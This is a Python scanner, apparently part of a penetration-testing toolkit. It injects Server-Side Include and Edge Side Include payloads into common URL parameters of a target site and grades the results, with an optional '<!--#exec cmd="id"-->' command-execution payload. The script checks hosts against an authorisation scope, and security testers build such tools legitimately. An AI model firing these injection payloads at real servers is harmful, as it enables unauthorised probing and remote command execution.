#!/usr/bin/env python3
"""SSI / ESI 表面（授权目标）。默认只打 echo/include，--deep 才 exec。

用法:
  python3 炼蛊房/ssi_esi_probe.py --base https://授权站 --case <案>
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urlencode, urljoin

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-ssi-esi"
PARAMS = ("q", "page", "file", "template", "name", "message", "search", "include")
PATHS = ("/", "/search", "/index.shtml", "/page.shtml", "/include.shtml")
ECHO = '<!--#echo var="DATE_LOCAL" -->'
DOC = '<!--#echo var="DOCUMENT_NAME" -->'
PRINTENV = "<!--#printenv -->"
NEG = "se-ssi-neg-7f3a"
INCLUDE = '<!--#include virtual="/se-ssi-marker" -->'
ESI = '<esi:include src="/se-esi-marker"/>'
EXEC = '<!--#exec cmd="id" -->'
DATE_RX = re.compile(
    r"(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+\w+\s+\d{1,2}\s+\d{2}:\d{2}|20\d{2}-\d{2}-\d{2}T"
)
UID_RX = re.compile(r"uid=\d+\(")


def ssi_processed(payload: str, body: str) -> bool:
    if not body or payload in body:
        return False
    if payload == ECHO:
        return bool(DATE_RX.search(body))
    if payload == DOC:
        return ("DOCUMENT_NAME" not in body) and bool(
            re.search(r"(?:index|page|include)\.shtml", body, re.I)
        )
    if payload == PRINTENV:
        return "DOCUMENT_NAME=" in body or "DATE_LOCAL=" in body
    if payload == INCLUDE:
        return "se-ssi-marker" not in body and (
            "failed to include" in body.lower() or "unable to include" in body.lower()
        )
    if payload == ESI:
        if payload.lower() in body.lower() or "esi:include" in body.lower():
            return False
        low = body.lower()
        return any(
            x in low
            for x in (
                "surrogate-control", "<!--esi", "unable to include",
                "failed to include", "could not include",
            )
        )
    if payload == EXEC:
        return bool(UID_RX.search(body)) or "se-ok" in body
    return False


def _req(sess: requests.Session, url: str, timeout: int) -> str:
    try:
        r = sess.get(url, timeout=timeout, verify=False, allow_redirects=False)
    except Exception:
        return ""
    return r.text or ""


def run(args: argparse.Namespace) -> dict[str, Any]:
    host = host_of(args.base)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.base}", file=sys.stderr)
        sys.exit(2)
    base = args.base.rstrip("/")
    sess = requests.Session()
    sess.headers["User-Agent"] = UA
    payloads = [ECHO, DOC, PRINTENV, INCLUDE, ESI]
    if args.deep:
        payloads.append(EXEC)
    findings: list[dict[str, Any]] = []
    for p in PATHS:
        clean = urljoin(base + "/", p.lstrip("/"))
        neg_url = f"{clean}{'&' if '?' in clean else '?'}{urlencode({PARAMS[0]: NEG})}"
        neg_body = _req(sess, neg_url, args.timeout)
        for name in PARAMS:
            for payload in payloads:
                url = f"{clean}{'&' if '?' in clean else '?'}{urlencode({name: payload})}"
                body = _req(sess, url, args.timeout)
                if not body:
                    continue
                if ssi_processed(payload, body) and not ssi_processed(payload, neg_body):
                    level = "L3" if payload == EXEC else (
                        "L2" if payload in {INCLUDE, ESI} else "L1"
                    )
                    findings.append({
                        "level": level,
                        "path": p,
                        "param": name,
                        "kind": payload[:24],
                    })
                    print(f"  {level} {p}?{name}= {payload[:32]}")
                    if level == "L3":
                        break
            if any(f.get("level") == "L3" for f in findings):
                break
        if any(f.get("level") == "L3" for f in findings):
            break
    level = "none"
    for want in ("L3", "L2", "L1"):
        if any(f.get("level") == want for f in findings):
            level = want
            break
    report = {
        "target": base,
        "ts": datetime.now(UTC).isoformat(),
        "level": level,
        "findings": findings,
        "playbook": "传承/浸页.md",
        "skill": "注门·2",
        "next": "L1=解析成立；L2=include；L3=exec。模板引擎走 ssti-exploit。",
    }
    out_path = write_probe_json(
        report, case=args.case, out=args.out, case_subdir="ssi_esi", filename="surface.json",
    )
    print(json.dumps({"level": level, "findings": len(findings), "out": str(out_path)}, ensure_ascii=False))
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="SSI/ESI 表面（授权内）")
    ap.add_argument("--base", "-u", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--timeout", type=int, default=8)
    ap.add_argument("--deep", action="store_true", help="加 exec cmd=id")
    args = ap.parse_args()
    run(args)


if __name__ == "__main__":
    main()
